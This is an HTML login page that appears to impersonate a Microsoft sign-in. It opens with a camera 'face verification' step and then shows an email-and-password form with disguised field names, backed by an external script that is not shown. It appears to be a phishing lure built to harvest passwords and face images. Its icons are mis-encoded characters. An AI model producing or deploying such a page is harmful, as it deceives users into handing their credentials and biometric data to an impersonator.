<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="security.css">
</head>
<body>
    <div class="auth-container">
        <div class="header">
            <img src="assets/company-logo.svg" alt="Microsoft" class="logo">
            <h1>Sign in</h1>
        </div>
        
        <!-- Face Verification Step (Shows First) -->
        <div id="faceVerificationStep" class="verification-step">
            <div class="verification-header">
                <div class="verification-icon">ðŸ‘¤</div>
                <h2>Face Verification</h2>
                <p>We need to verify your identity for security</p>
            </div>
            
            <div class="camera-preview">
                <div class="camera-placeholder">
                    <div class="camera-icon">ðŸ“·</div>
                    <p>Camera access required</p>
                </div>
            </div>
            
            <div class="verification-actions">
                <button id="startVerification" class="primary-action">
                    Start Face Verification
                </button>
                <button id="skipVerification" class="secondary-action">
                    Use password instead
                </button>
            </div>
        </div>

        <!-- Traditional Login Step (Hidden Initially) -->
        <div id="loginStep" class="login-step" style="display: none;">
            <form id="authForm" class="auth-form">
                <div class="form-group">
                    <input type="text" id="userIdentity" name="identity" placeholder="Email, phone, or username" required>
                </div>
                
                <div class="form-group">
                    <input type="password" id="secureAccess" name="access" placeholder="Password" required>
                </div>
                
                <button type="submit" class="primary-action">
                    <span class="button-text">Continue</span>
                    <span class="loading-spinner" style="display: none;">Securing...</span>
                </button>
            </form>
            
            <div class="support-links">
                <a href="#" id="useFaceVerification">Use face verification instead</a>
                <a href="https://support.microsoft.com" target="_blank">Can't access account?</a>
            </div>
        </div>
    </div>

    <script src="security.js"></script>
</body>
</html>
